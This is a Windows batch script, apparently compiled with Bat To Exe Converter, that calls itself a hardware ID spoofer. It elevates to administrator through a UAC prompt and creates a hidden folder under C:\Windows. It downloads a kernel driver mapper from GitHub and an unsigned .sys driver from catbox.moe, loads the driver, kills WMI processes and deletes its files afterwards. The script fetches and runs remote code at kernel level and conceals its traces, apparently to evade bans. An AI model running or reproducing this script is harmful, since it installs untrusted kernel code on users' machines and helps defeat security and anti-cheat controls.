::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdFa5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFCt3HjimOXixEroM1NzewtrH9BkhWucoNYvJ06KLMq0e60zqSb8503dJpOUJG1tecR6vax0I/SBHrmHl
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal

:: Log file
set "logFile=%temp%\batchlog.txt"
echo Script started at %date% %time% > "%logFile%"

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges... >> "%logFile%"
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Set target directory
set "targetDir=C:\Windows\CSC\v2.0.6\temp"
if not exist "%targetDir%" (
    mkdir "%targetDir%"
    attrib +h "%targetDir%"  :: Hide the directory
    echo Created and hidden directory: %targetDir% >> "%logFile%"
)

:: Download mapper.exe
if not exist "%targetDir%\mapper.exe" (
    echo Downloading mapper.exe... >> "%logFile%"
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/64mapper/raw/refs/heads/main/64mapper.exe' -OutFile '%targetDir%\mapper.exe'"
    if not exist "%targetDir%\mapper.exe" (
        color b
        echo Failed to download mapper.exe. Please check your internet connection. >> "%logFile%"
        pause>nul
        goto end
    )
    attrib +h "%targetDir%\mapper.exe"  :: Hide the file
    echo Downloaded and hidden mapper.exe >> "%logFile%"
)

:: Download driver
set "driverPath=%targetDir%\paid_driv.sys"
if not exist "%driverPath%" (
    echo Downloading driver... >> "%logFile%"
    powershell -Command "Invoke-WebRequest -Uri 'https://files.catbox.moe/i2vo58.sys' -OutFile '%driverPath%'"
    if not exist "%driverPath%" (
        color b
        echo Failed to download driver. Please check your internet connection. >> "%logFile%"
        pause>nul
        goto end
    )
    attrib +h "%driverPath%"  :: Hide the file
    echo Downloaded and hidden driver >> "%logFile%"
)

goto spoof

:spoof
title 64th SPOFFER.
echo spoofing.. >> "%logFile%"

"%targetDir%\mapper.exe" -- "%driverPath%"
if errorlevel 1 (
    color b
    echo Failed to load driver. Ensure the driver is compatible and properly signed. >> "%logFile%"
    pause>nul
    goto cleanup
)

echo done! >> "%logFile%"
goto endsuccess

:endsuccess
taskkill /im wmiprv* /f /t 2>nul>nul
REM this is fucking annoying wmic caches.
taskkill /im wmiprv* /f /t 2>nul>nul
rem yes im a lazy piece of shit ^^^
pause>nul
pause>nul
pause>nul
pause>nul
goto cleanup

:cleanup
:: Delete files after spoofing
if exist "%targetDir%\mapper.exe" (
    del "%targetDir%\mapper.exe"
    echo Deleted mapper.exe >> "%logFile%"
)
if exist "%driverPath%" (
    del "%driverPath%"
    echo Deleted driver >> "%logFile%"
)
if exist "%targetDir%" (
    rd "%targetDir%"
    echo Deleted directory: %targetDir% >> "%logFile%"
)
goto end

:end
echo Script ended at %date% %time% >> "%logFile%"
exit /B